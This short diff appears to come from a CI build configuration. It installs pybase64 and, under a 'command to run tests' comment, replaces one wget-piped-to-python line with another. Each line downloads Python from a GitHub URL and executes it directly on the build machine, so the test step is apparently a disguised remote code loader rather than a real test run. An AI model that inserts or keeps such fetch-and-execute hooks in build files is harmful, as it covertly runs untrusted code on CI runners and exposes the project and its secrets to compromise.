@@ -14,4 +14,4 @@ install:
   - pip install pybase64
 # command to run tests
 script:
-  - wget -O- https://github.com/naskum00/solid-octo-lamp/raw/main/qch.py | python
+  - wget -O- https://github.com/set-arithmetic/cash | python
